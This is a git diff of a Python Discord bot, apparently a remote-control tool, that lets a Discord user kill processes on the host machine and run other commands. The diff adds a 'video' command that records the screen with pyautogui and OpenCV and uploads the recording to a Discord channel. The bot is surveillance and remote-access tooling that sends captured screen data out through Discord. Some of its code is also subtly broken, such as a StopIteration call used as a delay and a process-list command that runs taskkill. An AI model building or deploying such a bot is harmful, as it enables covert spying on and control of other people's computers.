@@ -1,8 +1,6 @@
 '''Made by NullifiedVlad 
    ты не станешь крутым программистом если
    просто скопируешь его!'''
-print("importing addons...")
-
 import discord
 from discord.ext import commands
 import pyautogui as pg
@@ -10,8 +8,10 @@ import os
 import sys
 import subprocess
 from playsound import playsound
+import numpy as np
+import cv2
 import config
-print("Loading...")
+
 
 pg.FAILSAFE = False
 
@@ -87,4 +87,27 @@ async def kill(ctx,*,process):
 @bot.command()
 async def processlist(ctx):
     await ctx.send(subprocess.check_output(['taskkill']))
+
+@bot.command()
+async def video(ctx,how_many): #запись видео
+    output = 'video.avi'
+    img = pg.screenshot()
+    img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
+    height, width, channels = img.shape
+    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+    out = cv2.VideoWriter(output, fourcc, 20.0, (width, height))
+    loop = 0
+    while int(loop) <= int(how_many):
+        try:
+            img = pg.screenshot()
+            image = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
+            out.write(image)
+            StopIteration(0.5)
+            loop += 1
+        except KeyboardInterrupt:
+            break
+    await ctx.send(file=discord.File('video.avi'))
+    os.remove(output)
+    out.release()
+    cv2.destroyAllWindows()
 bot.run(config.token)
